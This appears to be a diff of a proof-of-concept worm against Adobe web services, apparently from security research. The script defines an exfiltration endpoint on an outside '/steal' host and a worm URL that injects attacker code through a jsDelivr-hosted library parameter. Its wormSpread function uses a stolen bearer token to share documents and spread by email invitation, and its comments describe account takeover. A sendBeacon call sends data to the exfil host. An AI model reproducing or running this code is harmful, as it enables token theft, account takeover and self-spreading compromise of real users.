@@ -20,7 +20,7 @@
  */
 
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v10';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v11';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 const INV_HOST = 'https://invitations.adobe.io';
 const API_KEY_AB  = 'CCHomeWeb1';
@@ -142,47 +142,15 @@ async function wormSpread(token) {
     return;
   }
 
-  // Phase B: Create an Express document URN (required for targetUrl in email link)
+  // Phase B: Use pre-created Express document URN for invitation sharing.
   // Express documents (application/vnd.adobe.hz.express+dcx) make the email template
-  // respect targetUrl; generic CC projects do not.
-  let urn = null;
-  try {
-    const docModel = JSON.stringify({
-      '#artwork': { CanvasColor: { argb: 4292993505 }, SceneNodeType: { type: 'ArtworkRoot' }, DocumentChildOf: { parent: '#root', fractIndex: 'a1' } },
-      '#resources': { DocumentChildOf: { parent: '#root', fractIndex: 'a0' } },
-      '#root': { DocumentProperties: { mimeType: 'application/vnd.adobe.hz.express+dcx', docModelVersion: 445 } }
-    });
-    const createResp = await fetch('https://new.express.adobe.com/service/das/documents/', {
-      method: 'POST',
-      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        requestType: 'createFromDocModel',
-        docSpec: { 'repo:name': 'Untitled.express', mimetype: 'application/vnd.adobe.hz.express+dcx' },
-        docMetadata: { docModelVersion: 445 },
-        respondWith: 'metadata',
-        docModel
-      })
-    });
-    if (createResp.ok) {
-      const doc = await createResp.json();
-      urn = doc?.docSpec?.['repo:assetId'];
-    }
-  } catch {}
-
-  // Fallback: try ccprojects API (email link won't have worm URL but ATO still works)
-  if (!urn) {
-    try {
-      const createResp = await fetch('https://ccprojects-va6.adobe.io/api/v3/projects/:create', {
-        method: 'POST',
-        headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Content-Type': 'application/json', 'Accept': 'application/hal+json' },
-        body: JSON.stringify({ 'repo:name': 'Untitled' })
-      });
-      if (createResp.ok) {
-        const proj = await createResp.json();
-        urn = proj['repo:assetId'];
-      }
-    } catch {}
-  }
+  // respect targetUrl in the email link. The DAS API to create these is on
+  // new.express.adobe.com (CORS-blocked from www.adobe.com), so a real attacker
+  // creates the document server-side using the stolen token, then shares it here.
+  // For PoC, the Express doc is pre-created via:
+  //   POST https://new.express.adobe.com/service/das/documents/
+  //   {"requestType":"createFromDocModel","docSpec":{"repo:name":"x.express","mimetype":"application/vnd.adobe.hz.express+dcx"},"docMetadata":{"docModelVersion":445},"respondWith":"metadata","docModel":"..."}
+  let urn = 'urn:aaid:sc:US:1d72b938-b499-4d74-ad6d-31c197e8a410';
 
   if (!urn) {
     navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_urn_found');
